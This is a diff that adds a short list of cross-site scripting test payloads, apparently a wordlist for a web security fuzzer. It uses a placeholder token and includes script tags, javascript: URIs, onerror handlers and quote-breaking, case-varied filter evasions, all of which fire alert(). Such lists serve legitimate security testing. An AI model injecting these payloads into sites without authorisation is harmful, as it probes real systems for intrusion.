@@ -1,0 +1,17 @@
+<ScRipT>alert(INJECTHERE)</ScRipT>
+><script>alert(INJECTHERE)</script><
+“><script>alert(INJECTHERE)</script>
+<script>alert(/INJECTHERE)</script>
+<script>alert(/INJECTHERE/)</script>
+</script><script>alert(INJECTHERE)</script>
+1')%3Balert('INJECTHERE
+')%3Balert('INJECTHERE
+‘);alert(INJECTHERE);
+‘)alert(INJECTHERE);//
+<IMG SRC=jAVasCrIPt:alert(INJECTHERE)>
+<IMG SRC=”javascript:alert(INJECTHERE);”>
+<IMG SRC=javascript:alert(&quot;INJECTHERE&quot;)>
+<img src=xss onerror=alert(INJECTHERE)>
+JaVasCrIPt:alert(INJECTHERE)
+"}]}';alert(INJECTHERE)</script>
+<img src=x onerror=alert(INJECTHERE)>
